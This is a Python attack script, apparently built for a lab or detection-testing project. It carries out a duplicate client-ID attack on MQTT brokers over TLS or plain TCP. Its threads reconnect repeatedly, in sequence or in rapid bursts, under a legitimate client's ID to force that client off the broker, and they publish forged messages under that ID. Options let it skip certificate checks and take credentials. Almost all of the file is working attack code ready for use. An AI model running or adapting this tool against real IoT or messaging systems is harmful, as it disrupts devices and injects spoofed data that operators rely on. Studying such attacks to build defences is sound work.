#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json, time, threading, random, argparse, ssl, os
from datetime import datetime, timezone

class DuplicateIDAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883,
                 ca_certs="certs/ca-cert.pem", insecure=False, use_tls=True):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.insecure = insecure
        self.use_tls = use_tls

        self.attack_stats = {
            "duplicate_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }

    def _print_cert_status(self):
        print(" TLS configuration:")
        print(f"  Broker: {self.broker_host}:{self.broker_port}")
        print(f"  TLS enabled: {self.use_tls}")
        if not self.use_tls:
            print("=" * 60)
            return
        
        print(f"  Using CA file (Hardcoded/Default): {self.ca_certs} -> {'FOUND' if (self.ca_certs and os.path.exists(self.ca_certs)) else 'MISSING'}")
        print(f"  Insecure mode (skip verification): {self.insecure}")
        print("=" * 60)

    def create_client(self, client_id, username=None, password=None):
        try:
            try:
                client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
            except Exception:
             
                api = getattr(mqtt, "CallbackAPIVersion", None)
                if api is not None:
                    v1 = getattr(api, "V1", getattr(api, "VERSION1", None))
                    client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311, callback_api_version=v1)
                else:
                    client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            if not self.use_tls:
                if username and password:
                    client.username_pw_set(username, password)
                return client

            
            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(
                    ca_certs=self.ca_certs,
                    cert_reqs=ssl.CERT_REQUIRED,
                    tls_version=ssl.PROTOCOL_TLS_CLIENT,
                    ciphers=None
                )
            else:
                
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            if self.insecure:
                try:
                    client.tls_insecure_set(True)
                except Exception:
                    pass

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def duplicate_id_worker(self, worker_id, dup_id, attempts=10, delay_ms=1000, username=None, password=None):
        proto = "TLS" if self.use_tls else "plain"
        print(f" Worker {worker_id}: duplicate-ID attack using client-id '{dup_id}' over {proto}")
        for attempt in range(attempts):
            try:
                client = self.create_client(dup_id, username, password)
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue

                def on_connect(c, u, f, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        print(f" Worker {worker_id}: attempt {attempt+1} connected OK ({proto})")
                        # Gửi một vài tin nhắn giả mạo để tăng tính chân thực
                        for i in range(3):
                            payload = {
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "packet_type": "CONNECT",
                                "client_id": dup_id,
                                "src_ip": "127.0.0.1",
                                "attack_signature": "R6_DUPLICATE_CLIENT_ID",
                                "worker_id": worker_id,
                                "attempt": attempt + 1,
                                "msg": i,
                                "duplicate_detected": True
                            }
                            try:
                                r = c.publish("test/duplicate", json.dumps(payload))
                                if getattr(r, "rc", 1) == 0:
                                    self.attack_stats["messages_sent"] += 1
                            except Exception:
                                pass
                        time.sleep(1)
                    else:
                        self.attack_stats["connections_failed"] += 1
                        print(f" Worker {worker_id}: connect rc={rc}")

                def on_disconnect(c, u, rc):
                    self.attack_stats["disconnections"] += 1
                    if rc != 0:
                        # In ra nếu bị ngắt kết nối bất ngờ (thường là do client thật kết nối lại)
                        print(f" Worker {worker_id}: unexpected disconnect rc={rc}")

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                self.attack_stats["duplicate_attempts"] += 1
                
                # Giữ kết nối một chút để đẩy client cũ ra
                time.sleep(2)
                
                client.loop_stop()
                client.disconnect()
                time.sleep(delay_ms / 1000.0)
            except Exception as e:
                print(f" Worker {worker_id}: attempt {attempt+1} error: {e}")
                self.attack_stats["connections_failed"] += 1
        print(f" Worker {worker_id}: finished")

    def simultaneous_duplicate_worker(self, worker_id, dup_id, duration_seconds=30, username=None, password=None):
        proto = "TLS" if self.use_tls else "plain"
        print(f" Worker {worker_id}: simultaneous duplicate-ID attack using client-id '{dup_id}' over {proto} for {duration_seconds}s")
        end_time = time.time() + duration_seconds
        while time.time() < end_time:
            try:
                client = self.create_client(dup_id, username, password)
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    time.sleep(0.1)
                    continue

                def on_connect(c, u, f, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1

                def on_disconnect(c, u, rc):
                    self.attack_stats["disconnections"] += 1

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                self.attack_stats["duplicate_attempts"] += 1
                
                # Kết nối rất ngắn để tạo xung đột liên tục
                time.sleep(0.1)
                
                client.loop_stop()
                client.disconnect()
            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                time.sleep(0.1)
        print(f" Worker {worker_id}: finished simultaneous run")

    def launch_attack(self, workers=3, dup_id="duplicate_attacker", attempts=10, delay_ms=1000, username=None, password=None, attack_type="sequential", duration=30):
        print(f"\n Starting Duplicate-ID Attack on {self.broker_host}:{self.broker_port}")
        self._print_cert_status()
        print("=" * 60)
        self.attack_stats["start_time"] = time.time()

        threads = []
        if attack_type == "simultaneous":
            for i in range(workers):
                threads.append(threading.Thread(target=self.simultaneous_duplicate_worker, args=(i, dup_id, duration, username, password)))
        else:
            for i in range(workers):
                threads.append(threading.Thread(target=self.duplicate_id_worker, args=(i, dup_id, attempts, delay_ms, username, password)))

        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.attack_stats["end_time"] = time.time()
        self.print_stats()

    def print_stats(self):
        if self.attack_stats["end_time"] and self.attack_stats["start_time"]:
            dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        else:
            dur = 0
        print("\n Attack Stats")
        print("=" * 40)
        for k, v in self.attack_stats.items():
            if k not in ("start_time", "end_time"):
                print(f"{k.replace('_',' ').capitalize()}: {v}")
        if dur > 0:
            print(f"Duration: {dur:.2f}s | Attempts/s: {self.attack_stats['duplicate_attempts']/dur:.2f}")
        else:
            print(f"Duration: 0.00s | Attempts/s: 0.00")

def main():
    p = argparse.ArgumentParser(description="MQTT Duplicate Client-ID Attack (TLS-aware - CA Hardcoded)")
    p.add_argument("--broker", default="localhost")
    p.add_argument("--port", type=int, default=8884)
    p.add_argument("--workers", type=int, default=3)
    p.add_argument("--client-id", default="duplicate_attacker_tls")
    p.add_argument("--attempts", type=int, default=10)
    p.add_argument("--delay", type=int, default=1000, help="Delay between attempts (ms)")
    p.add_argument("--username", help="MQTT username for authentication")
    p.add_argument("--password", help="MQTT password for authentication")
    p.add_argument("--type", choices=["sequential", "simultaneous"], default="sequential",
                   help="Attack type: sequential or simultaneous")
    p.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")

   
    p.add_argument("--ca", default="certs/ca-cert.pem", help="Path to CA certificate file (Default: certs/ca-cert.pem)")
    p.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
    p.add_argument("--no-tls", action="store_true", help="Force plain TCP (no TLS)")
    p.add_argument("--tls", action="store_true", help="Force TLS even on default plaintext ports")

    args = p.parse_args()

  
    if args.no_tls:
        use_tls = False
    elif args.tls:
        use_tls = True
    else:
        use_tls = True if args.port in (8883, 8884) else False

    attack = DuplicateIDAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,
        insecure=args.insecure,
        use_tls=use_tls
    )

    attack.launch_attack(
        workers=args.workers,
        dup_id=args.client_id,
        attempts=args.attempts,
        delay_ms=args.delay,
        username=args.username,
        password=args.password,
        attack_type=args.type,
        duration=args.duration 
    )

if __name__ == "__main__":
    main()
